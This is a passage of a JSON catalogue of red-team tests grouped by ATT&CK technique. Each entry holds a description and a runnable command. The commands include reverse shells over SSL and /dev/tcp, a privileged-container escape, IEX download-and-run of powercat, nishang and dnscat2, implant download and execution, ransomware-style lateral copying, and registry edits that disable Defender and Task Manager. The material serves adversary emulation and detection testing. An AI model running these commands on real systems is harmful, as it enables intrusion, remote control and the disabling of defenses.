            "command": "wscript.exe \"bf591b_T1105-download-file.vbs\""
         },
         {
            "description": "Uses the cmdl32 to download arbitrary file from the internet. The cmdl32 package is allowed to install the profile used to launch the VPN connection. However, the config is modified to download the arbitary file. \nThe issue of cmdl32.exe detecting and deleting the payload by identifying it as not a VPN Servers profile is avoided by setting a temporary TMP folder and denying the delete permission to all files for the user.\nUpon successful execution the test will open calculator and Notepad executable for 10 seconds.\nreference:\nhttps://twitter.com/ElliotKillick/status/1455897435063074824\nhttps://github.com/LOLBAS-Project/LOLBAS/pull/151\nhttps://lolbas-project.github.io/lolbas/Binaries/Cmdl32/\nhttps://strontic.github.io/xcyclopedia/library/cmdl32.exe-FA1D5B8802FFF4A85B6F52A52C871BBB.html\n",
            "command": "\"821ca9_T1105.bat\" 1>NUL"
         },
         {
            "description": "This test simulates MAZE ransomware's propogation script that searches through a list of computers, tests connectivity to them, and copies a binary file to the Windows\\Temp directory of each one. \nUpon successful execution, a specified binary file will attempt to be copied to each online machine, a list of the online machines, as well as a list of offline machines will be output to a specified location.\nReference: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html \n",
            "command": "$machine_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt\"; $offline_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105OfflineHosts.txt\"; $completed_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\"; foreach ($machine in get-content -path \"$machine_list\"); {if (test-connection -Count 1 -computername $machine -quiet) ; {cmd /c copy \"$env:comspec\" \"\\\\$machine\\C$\\Windows\\Temp\\T1105.exe\"; echo $machine >> \"$completed_list\"; wmic /node: \"$machine\" process call create \"regsvr32.exe /i C:\\Windows\\Temp\\T1105.exe\"}; else; {echo $machine >> \"$offline_list\"}}"
         },
         {
            "description": "Download a remote file using the whois utility\n",
            "command": "timeout --preserve-status 1 whois -h localhost -p 8443 \"Hello from Atomic Red Team test T1105\" > /tmp/T1105.whois.out"
         },
         {
            "description": "A reverse-shell agent which communicates via the TCP contact",
            "command": "server=\"#{app.contact.http}\";\nsocket=\"#{app.contact.tcp}\";\ncontact=\"tcp\";\ncurl -s -X POST -H \"file:manx.go\" -H \"platform:darwin\" $server/file/download > #{agents.implant_name};\nchmod +x #{agents.implant_name};\n./#{agents.implant_name} -http $server -socket $socket -contact $contact -v\n"
         },
         {
            "description": "CALDERA's default agent, written in GoLang. Communicates through the HTTP(S) contact by default.",
            "command": "server=\"#{app.contact.http}\";\ncurl -s -X POST -H \"file:sandcat.go\" -H \"platform:darwin\" $server/file/download > #{agents.implant_name};\nchmod +x #{agents.implant_name};\n./#{agents.implant_name} -server $server -v\n"
         },
         {
            "description": "Download, install and start new process under PowerShell Core 6",
            "command": "$wc=New-Object System.Net.WebClient;\n$output=\"PowerShellCore.msi\";\n$wc.DownloadFile(\"https://github.com/PowerShell/PowerShell/releases/download/v6.2.2/PowerShell-6.2.2-win-x64.msi\", $output);\nStart-Process msiexec.exe -ArgumentList \"/package PowerShellCore.msi /quiet ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 ENABLE_PSREMOTING=1 REGISTER_MANIFEST=1\" -Wait;\n$env:Path += \";C:\\Program Files\\Powershell\\6\";\nStart-Process pwsh -ArgumentList \"-c #{location} -server #{server} - group #{group}\" -WindowStyle hidden;\n"
         },
         {
            "description": "Download and install PSTools by unzipping the file",
            "command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadFile(\"https://download.sysinternals.com/files/PSTools.zip\", \"PSTools.zip\");\nNew-Item -ItemType \"directory\" C:\\Windows\\System32\\PSTools -Force;\nAdd-Type -Assembly 'System.IO.Compression.FileSystem'; [System.IO.Compression.ZipFile]::ExtractToDirectory(\"PSTools.zip\", \"C:\\Windows\\System32\\PSTools\");\n"
         }
      ]
   },
   "T1573": {
      "technique_name": "Encrypted Channel",
      "tactic": "command-and-control",
      "known implementations": [
         {
            "description": "Thanks to @OrOneEqualsOne for this quick C2 method.\nThis is to test to see if a C2 session can be established using an SSL socket.\nMore information about this technique, including how to set up the listener, can be found here:\nhttps://medium.com/walmartlabs/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926\n\nUpon successful execution, powershell will make a network connection to 127.0.0.1 over 443.\n",
            "command": "$server_ip =; $server_port =; $socket = New-Object Net.Sockets.TcpClient('#{server_ip}', '#{server_port}'); $stream = $socket.GetStream(); $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback])); $sslStream.AuthenticateAsClient('fakedomain.example', $null, \"Tls12\", $false); $writer = new-object System.IO.StreamWriter($sslStream); $writer.Write('PS ' + (pwd).Path + '> '); $writer.flush(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0); {$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data | Out-String ) 2>&1; $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}"
         }
      ]
   },
   "T1572": {
      "technique_name": "Protocol Tunneling",
      "tactic": "command-and-control",
      "known implementations": [
         {
            "description": "This test simulates an infected host returning data to a command and control server using long domain names.\nThe simulation involves sending DoH queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DoH queries for long domain names over a set threshold.\n Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n",
            "command": "Set-Location \"C:\\Users\\puma-4\\Desktop\"; C:\\Users\\puma-4\\Desktop\\T1572-doh-domain-length.ps1 -DohServer \"https://8.8.8.8/resolve\""
         },
         {
            "description": "Download and run ngrok. Create tunnel to chosen port.\n",
            "command": "C:\\Users\\Public\\ngrok\\ngrok.exe config add-authtoken N/A | Out-Null; Start-Job -ScriptBlock { C:\\Users\\Public\\ngrok\\ngrok.exe tcp 3389 } | Out-Null; Start-Sleep -s 5 ; Stop-Job -Name Job1 | Out-Null"
         },
         {
            "description": "This test simulates an infected host beaconing via DoH queries to a command and control server at regular intervals over time.\nThis behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n",
            "command": "Set-Location \"C:\\Users\\puma-4\\Desktop\"; C:\\Users\\puma-4\\Desktop\\T1572-doh-beacon.ps1 -DohServer \"https://8.8.8.8/resolve\""
         },
         {
            "description": "This test simulates an infected host sending a large volume of DoH queries to a command and control server.\nThe intent of this test is to trigger threshold based detection on the number of DoH queries either from a single source system or to a single targe domain.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n",
            "command": "for($i=0; $i -le"
         }
      ]
   },
   "T1132.001": {
      "technique_name": "Data Encoding: Standard Encoding",
      "tactic": "command-and-control",
      "known implementations": [
         {
            "description": "Utilizing a common technique for posting base64 encoded data.\n",
            "command": "echo -n 111-11-1111 | base64; curl -XPOST MTExLTExLTExMTE=.redcanary.com"
         },
         {
            "description": "XOR encodes the data with a XOR key.\nReference - https://gist.github.com/loadenmb/8254cee0f0287b896a05dcdc8a30042f\n",
            "command": "$plaintext = ([system.Text.Encoding]::UTF8.getBytes(\"Path\\n----\\nC:\\Users\\victim\")); $key = \"abcdefghijklmnopqrstuvwxyz123456\"; $cyphertext =  @(); for ($i = 0; $i -lt $plaintext.Count; $i++) {;  $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length]; }; $cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext); [System.Net.ServicePointManager]::Expect100Continue = $false; Invoke-WebRequest -Uri example.com -Method POST -Body $cyphertext -DisableKeepAlive"
         }
      ]
   },
   "T1571": {
      "technique_name": "Non-Standard Port",
      "tactic": "command-and-control",
      "known implementations": [
         {
            "description": "Testing uncommonly used port utilizing PowerShell. APT33 has been known to attempt telnet over port 8081. Upon execution, details about the successful\nport check will be displayed.\n",
            "command": "Test-NetConnection -ComputerName google.com -port 8081"
         },
         {
            "description": "Testing uncommonly used port utilizing telnet.\n",
            "command": "echo quit | telnet google.com 8081; exit 0"
         }
      ]
   },
   "T1090.003": {
      "technique_name": "Proxy: Multi-hop Proxy",
      "tactic": "command-and-control",
      "known implementations": [
         {
            "description": "This test is designed to launch the tor proxy service, which is what is utilized in the background by the Tor Browser and other applications with add-ons in order to provide onion routing functionality.\nUpon successful execution, the tor proxy service will be launched. \n",
            "command": "if [ -x \"$(command -v tor --version)\" ]; then : ; else sudo apt-get -y install tor; fi;  ;  sudo systemctl start tor"
         },
         {
            "description": "This test is designed to launch the tor proxy service, which is what is utilized in the background by the Tor Browser and other applications with add-ons in order to provide onion routing functionality.\nUpon successful execution, the tor proxy will be launched, run for 60 seconds, and then exit. \n",
            "command": "invoke-expression 'cmd /c start powershell -Command {cmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\tor\\Tor\\tor.exe\"}'; sleep -s 60; stop-process -name \"tor\" | out-null"
         },
         {
            "description": "Psiphon 3 is a circumvention tool from Psiphon Inc. that utilizes VPN, SSH and HTTP Proxy technology to provide you\nwith uncensored access to Internet.\nThis process will launch Psiphon 3 and establish a connection. Shortly after it will be shut down via process kill commands.\nMore information can be found about Psiphon using the following urls\nhttp://s3.amazonaws.com/0ubz-2q11-gi9y/en.html\nhttps://psiphon.ca/faq.html\n",
            "command": "& \"C:\\Users\\puma-4\\Desktop\\Psiphon.bat\""
         },
         {
            "description": "This test is designed to launch the tor proxy service, which is what is utilized in the background by the Tor Browser and other applications with add-ons in order to provide onion routing functionality.\nUpon successful execution, the tor proxy service will be launched. \n",
            "command": "if [ -x \"$(command -v tor --version)\" ]; then : ; else if [ ! -x \"$(command -v brew --version)\" ]; then /bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh keystroke return)\"; fi; brew install tor; fi;  ;  osascript -e 'tell application \"Terminal\" to do script \"tor\"'"
         }
      ]
   },
   "T1095": {
      "technique_name": "Non-Application Layer Protocol",
      "tactic": "command-and-control",
      "known implementations": [
         {
            "description": "Start C2 Session Using Ncat\nTo start the listener on a Linux device, type the following: \nnc -l -p <port>\n",
            "command": "cmd /c \"#{ncat_exe}\""
         },
         {
            "description": "Start C2 Session Using Powercat\nTo start the listener on a Linux device, type the following: \nnc -l -p <port>\n",
            "command": "IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1'); powercat -c"
         },
         {
            "description": "This will attempt to  start C2 Session Using ICMP. For information on how to set up the listener\nrefer to the following blog: https://www.blackhillsinfosec.com/how-to-c2-over-icmp/\n",
            "command": "IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1'); Invoke-PowerShellIcmp -IPAddress"
         }
      ]
   },
   "T1071.004": {
      "technique_name": "Application Layer Protocol: DNS",
      "tactic": "command-and-control",
      "known implementations": [
         {
            "description": "This will attempt to start a C2 session using the DNS protocol. You will need to have a listener set up and create DNS records prior to executing this command.\nThe following blogs have more information.\n\nhttps://github.com/iagox86/dnscat2\n\nhttps://github.com/lukebaggett/dnscat2-powershell\n",
            "command": "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1'); Start-Dnscat2 -Domain"
         },
         {
            "description": "This test simulates an infected host returning data to a command and control server using long domain names.\nThe simulation involves sending DNS queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DNS queries for long domain names over a set threshold.\n Upon execution, DNS information about the domain will be displayed for each callout.\n",
            "command": "Set-Location \"C:\\Users\\puma-4\\Desktop\"; C:\\Users\\puma-4\\Desktop\\T1071-dns-domain-length.ps1 -Domain 127.0.0.1.nip.io -Subdomain atomicredteamatomicredteamatomicredteamatomicredteamatomicredte -QueryType TXT"
         },
         {
            "description": "This test simulates an infected host sending a large volume of DNS queries to a command and control server.\nThe intent of this test is to trigger threshold based detection on the number of DNS queries either from a single source system or to a single targe domain.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.\n",
            "command": "for($i=0; $i -le 1000; $i++) { Resolve-DnsName -type \"TXT\" \"atomicredteam-$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.nip.io\" -QuickTimeout}"
         },
         {
            "description": "This test simulates an infected host beaconing via DNS queries to a command and control server at regular intervals over time.\nThis behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.\n",
            "command": "Set-Location \"C:\\Users\\puma-4\\Desktop\"; C:\\Users\\puma-4\\Desktop\\T1071-dns-beacon.ps1 -Domain 127.0.0.1.nip.io -Subdomain atomicredteam -QueryType TXT -C2Interval 30 -C2Jitter 20 -RunTime 30"
         }
      ]
   },
   "T1090.001": {
      "technique_name": "Proxy: Internal Proxy",
      "tactic": "command-and-control",
      "known implementations": [
         {
            "description": "Enable traffic redirection on macOS UI (not terminal).\nThe test will modify and enable the \"Web Proxy\" and \"Secure Web Proxy\" settings  in System Preferences => Network => Advanced => Proxies for the specified network interface.\n\nNote that this test may conflict with pre-existing system configuration.\n",
            "command": "networksetup -setwebproxy; networksetup -setsecurewebproxy"
         },
         {
            "description": "Enable traffic redirection.\n\nNote that this test may conflict with pre-existing system configuration.\n",
            "command": "export"
         },
         {
            "description": "Adds a registry key to set up a proxy on the endpoint at HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4\nUpon execution there will be a new proxy entry in netsh\nnetsh interface portproxy show all\n",
            "command": "netsh interface portproxy add v4tov4 listenport=1337 connectport=1337 connectaddress=127.0.0.1"
         }
      ]
   },
   "T1071.001": {
      "technique_name": "Application Layer Protocol: Web Protocols",
      "tactic": "command-and-control",
      "known implementations": [
         {
            "description": "This test simulates an infected host beaconing to command and control. Upon execution, no output will be displayed. \nUse an application such as Wireshark to record the session and observe user agent strings and responses.\n\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n",
            "command": "Invoke-WebRequest www.google.com -UserAgent \"HttpBrowser/1.0\" | out-null; Invoke-WebRequest www.google.com -UserAgent \"Wget/1.9+cvs-stable (Red Hat modified)\" | out-null; Invoke-WebRequest www.google.com -UserAgent \"Opera/8.81 (Windows NT 6.0; U; en)\" | out-null; Invoke-WebRequest www.google.com -UserAgent \"*<|>*\" | out-null"
         },
         {
            "description": "This test simulates an infected host beaconing to command and control. Upon execution, no out put will be displayed. \nUse an application such as Wireshark to record the session and observe user agent strings and responses.\n\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n",
            "command": "C:\\Windows\\System32\\Curl.exe -s -A \"HttpBrowser/1.0\" -m3 www.google.com >nul 2>&1 && C:\\Windows\\System32\\Curl.exe -s -A \"Wget/1.9+cvs-stable (Red Hat modified)\" -m3 www.google.com >nul 2>&1 && C:\\Windows\\System32\\Curl.exe -s -A \"Opera/8.81 (Windows NT 6.0; U; en)\" -m3 www.google.com >nul 2>&1 && C:\\Windows\\System32\\Curl.exe -s -A \"*<|>*\" -m3 www.google.com >nul 2>&1"
         },
         {
            "description": "This test simulates an infected host beaconing to command and control.\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n",
            "command": "curl -s -A \"HttpBrowser/1.0\" -m3 www.google.com; curl -s -A \"Wget/1.9+cvs-stable (Red Hat modified)\" -m3 www.google.com; curl -s -A \"Opera/8.81 (Windows NT 6.0; U; en)\" -m3 www.google.com; curl -s -A \"*<|>*\" -m3 www.google.com"
         },
         {
            "description": "A Python agent which communicates via the HTML contact",
            "command": "server=\"#{app.contact.http}\";\ncurl -s -X POST -H \"file:ragdoll.py\" -H \"platform:darwin\" $server/file/download > ragdoll.py;\npip install requests beautifulsoup4;\npython ragdoll.py -W $server#{app.contact.html}\n"
         }
      ]
   },
   "T1611": {
      "technique_name": "Escape to Host",
      "tactic": "privilege-escalation",
      "known implementations": [
         {
            "description": "This technique abuses privileged Docker containers to mount the host's filesystem and then create a cron job to launch a reverse shell as the host's superuser.\nThe container running the test needs be privileged.  It may take up to a minute for this to run due to how often crond triggers a job.\nDev note: the echo to create cron_filename is broken up to prevent localized execution of hostname and id by Powershell. \n",
            "command": "if [ ! -d /mnt/T1611.002 ]; then mkdir /mnt/T1611.002 ; mount /dev/dm-0 /mnt/T1611.002; fi; echo -n \"* * * * * root /bin/bash -c '/bin/bash -c echo \\\"\\\"; echo \\\"hello from host! \" > /mnt/T1611.002/etc/cron.d/T1611_002; echo -n \"$\" >> /mnt/T1611.002/etc/cron.d/T1611_002; echo -n \"(hostname) \" >> /mnt/T1611.002/etc/cron.d/T1611_002; echo -n \"$\" >> /mnt/T1611.002/etc/cron.d/T1611_002; echo \"(id)\\\" >& /dev/tcp/`ifconfig eth0 | grep inet | awk '{print $2}'`/4444 0>&1'\" >> /mnt/T1611.002/etc/cron.d/T1611_002; netcat -l -p 4444 2>&1"
         },
         {
            "description": "In this escape `kubectl` is used to launch a new pod, with a container that has the host pids mapped into the container (`hostPID:true`). It uses the alpine linux container image. It runs with privilege on the host (`privileged:true`). When the container is launched the command `nsenter --mount=/proc/1/ns/mnt -- /bin/bash` is ran. Since the host processes have been mapped into the container, the container enters the host namespace, escaping the container.\n\nAdditional Details:\n- https://twitter.com/mauilion/status/1129468485480751104\n- https://securekubernetes.com/scenario_2_attack/\n",
            "command": "kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=Never -ti --rm --image alpine --overrides '{\"spec\":{\"hostPID\": true, \"containers\":[{\"name\":\"1\",\"image\":\"alpine\",\"command\":[\"nsenter\",\"--mount=/proc/1/ns/mnt\",\"--\",\"/bin/bash\"],\"stdin\": true,\"tty\":true,\"securityContext\":{\"privileged\":true}}]}}'"
         }
      ]
   },
   "T1218.008": {
      "technique_name": "Signed Binary Proxy Execution: Odbcconf",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Execute arbitrary response file that will spawn PowerShell.exe.\nSource files: https://github.com/woanware/application-restriction-bypasses\n",
            "command": "cd \"PathToAtomicsFolder\\T1218.008\\bin\\\" && odbcconf.exe -f \"T1218.008.rsp\""
         },
         {
            "description": "Execute arbitrary DLL file stored locally.\n",
            "command": "odbcconf.exe /S /A {REGSVR \"#{dll_payload}\"}"
         }
      ]
   },
   "T1222.001": {
      "technique_name": "File and Directory Permissions Modification: Windows File and Directory Permissions Modification",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Removes the read-only attribute from a file or folder using the attrib.exe command. Upon execution, no output will be displayed.\nOpen the file in File Explorer > Right Click - Prperties and observe that the Read Only checkbox is empty.\n",
            "command": "attrib.exe -r %temp%\\T1222.001_attrib\\*.* /s"
         },
         {
            "description": "Invokes the command line similar to that used by Ryuk Ransomware to grant full access to the entire C:\\ drive for Everyone.\n**icacls \"C:\\*\" /grant Everyone:F /T /C /Q**\nHowever, for this atomic we set the permission on C:\\Users\\Public so it completes faster and doesn't irreversibly affect the host.\nYou can set your own path variable to \"C:\\*\" if you prefer.\n",
            "command": "icacls \"C:\\Users\\Public\\*\" /grant Everyone:F /T /C /Q"
         },
         {
            "description": "Modifies the filesystem permissions of the specified folder and contents to allow the specified user or group Full Control. If \"Access is denied\"\nis displayed it may be because the file or folder doesn't exit. Run the prereq command to create it. Upon successfull execution, \"Successfully processed 3 files\"\nwill be displayed.\n",
            "command": "icacls.exe #{file_or_folder} /grant #{user_or_group}:F"
         },
         {
            "description": "Modifies the filesystem permissions of the specified file or folder to take ownership of the object. Upon execution, \"SUCCESS\" will\nbe displayed for the folder and each file inside of it.\n",
            "command": "takeown.exe /f %temp%\\T1222.001_takeown_folder /r"
         },
         {
            "description": "Attackers leverage an existing Windows binary, attrib.exe, to mark specific files or folder as hidden by using specific flags so that\nthe victim does not see the file.\n",
            "command": "mkdir %temp%\\T1222.001_attrib_2 >nul 2>&1 && echo T1222.001_attrib1 >> %temp%\\T1222.001_attrib_2\\T1222.001_attrib1.txt && echo T1222.001_attrib2 >> %temp%\\T1222.001_attrib_2\\T1222.001_attrib2.txt && attrib.exe +h %temp%\\T1222.001_attrib_2\\T1222.001_attrib1.txt && attrib.exe +h %temp%\\T1222.001_attrib_2\\T1222.001_attrib2.txt"
         }
      ]
   },
   "T1112": {
      "technique_name": "Modify Registry",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Modify the registry to allow a driver, service, to persist in Safe Mode with networking.\nsee https://redcanary.com/blog/tracking-driver-inventory-to-expose-rootkits/ and https://blog.didierstevens.com/2007/03/26/playing-with-safe-mode/ for further details.\nAdding a subkey to Netowrk with the name of your service and a default value set to Service, makes that your service will be started when you boot into Safe Mode with networking.\n",
            "command": "REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\AtomicSafeMode\" /VE /T REG_SZ /F /D \"Service\""
         },
         {
            "description": "Attackers may add a domain to the trusted site zone to bypass defenses. Doing this enables attacks such as c2 over office365.\nUpon execution, details of the new registry entries will be displayed.\nAdditionally, open Registry Editor to view the modified entry in HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\.\n\nhttps://www.blackhat.com/docs/us-17/wednesday/us-17-Dods-Infecting-The-Enterprise-Abusing-Office365-Powershell-For-Covert-C2.pdf\n",
            "command": "$key= \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\bad-domain.com\\\"; $name =\"bad-subdomain\"; new-item $key -Name $name -Force; new-itemproperty $key$name -Name https -Value 2 -Type DWORD; new-itemproperty $key$name -Name http  -Value 2 -Type DWORD; new-itemproperty $key$name -Name *     -Value 2 -Type DWORD; "
         },
         {
            "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable windows error reporting settings. This Windows feature allow the use to report bug, errors, failure or problems \nencounter in specific application or process.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
            "command": "reg add HKLM64\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f && reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f"
         },
         {
            "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows task manager application.\nSee example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry\n",
            "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskmgr /t REG_DWORD /d 1 /f"
         },
         {
            "description": "Modify event viewer registry values to alter the behavior of the online help redirection. Upon opening an event in event viewer and attempting to view the help page for the event, it will open the URL or execute the program defined in the redirection URL registry entry.",
            "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" /v MicrosoftRedirectionURL /t REG_SZ /d \"file://C:\\windows\\system32\\notepad.exe\" /f"
         },
         {
            "description": "Disable Win Defender Notification. Redline is using this to disable this win defender feature.\n",
            "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications\" /v \"DisableNotifications\" /t REG_DWORD /d 1 /f"
         },
         {
            "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to show compress color and show tips feature. \nSee how hermeticwiper uses this technique - https://www.splunk.com/en_us/blog/security/detecting-hermeticwiper.html\n",
            "command": "reg  add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowInfoTip /t REG_DWORD /d 0 /f && reg  add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowCompColor /t REG_DWORD /d 0 /f"
         },
         {
            "description": "Enabling RDP through remote registry.\n",
            "command": "reg add \"hklm\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Winstations\\RDP-Tcp\" /v SecurityLayer /t REG_DWORD /d 0 /f"
         },
         {
            "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable Control Panel Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
            "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoControlPanel /t REG_DWORD /d 1 /f"
         },
         {
            "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows shutdown button.\nSee how ransomware abuses this technique- https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/ransom.msil.screenlocker.a/\n",
            "command": "reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f"
         },
         {
            "description": "Tamper Win Defender Protection. RedLine Stealer is executing another component file to modify this win defender feature in registry. \nTake note that this modification might not be enough to disable this feature but can be a good indicator of malicious process that \ntries to tamper this Win Defender feature settings.\n",
            "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /v \"TamperProtection\" /t REG_DWORD /d 0 /f"
         },
         {
            "description": "A registry modification to allow Simultaneous download in the system.\n",
            "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"MaxConnectionsPerServer\" /t REG_DWORD /d 10 /f && reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"MaxConnectionsPer1_0Server\" /t REG_DWORD /d 10 /f"
         },
         {
            "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable context menu for taskbar Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
            "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoTrayContextMenu /t REG_DWORD /d 1 /f"
         },
         {
            "description": "The built-in Windows Remote Desktop Connection (RDP) client (mstsc.exe) saves the remote computer name (or IP address) and the username that is used to login after each successful connection to the remote computer\n",
            "command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" /va /f && reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" /f"
         },
         {
            "description": "Ursnif downloads additional modules from the C&C server and saves these in the registry folder HKEY_CURRENT_USER\\Software\\AppDataLow\\Software\\Microsoft\\\nMore information - https://blog.trendmicro.com/trendlabs-security-intelligence/phishing-campaign-uses-hijacked-emails-to-deliver-ursnif-by-replying-to-ongoing-threads/\n",
            "command": "reg add HKCU\\Software\\AppDataLow\\Software\\Microsoft\\3A861D62-51E0-15700F2219A4 /v comsxRes /t REG_BINARY  /d 72656463616e617279 /f"
         },
         {
            "description": "This task recreates the steps taken by BlackByte ransomware before it worms to other machines.  See \"Preparing to Worm\" section: https://redcanary.com/blog/blackbyte-ransomware/\nThe steps are as follows:\n<ol>\n    <li>1. Elevate Local Privilege by disabling UAC Remote Restrictions</li>\n    <li>2. Enable OS to share network connections between different privilege levels</li>\n    <li>3. Enable long path values for file paths, names, and namespaces to ensure encryption of all file names and paths</li>\n</ol>\nThe registry keys and their respective values will be created upon successful execution.\n",
            "command": "cmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f && cmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f && cmd.exe /c reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem /v LongPathsEnabled /t REG_DWORD /d 1 /f"
         },
         {
            "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows change password feature.\nSee how ransomware abuses this technique- https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/ransom_heartbleed.thdobah\n",
            "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableChangePassword /t REG_DWORD /d 1 /f"
         },
         {
            "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to prevent user running specific computer programs that could aid them in manually removing malware or detecting it \nusing security product.\n",
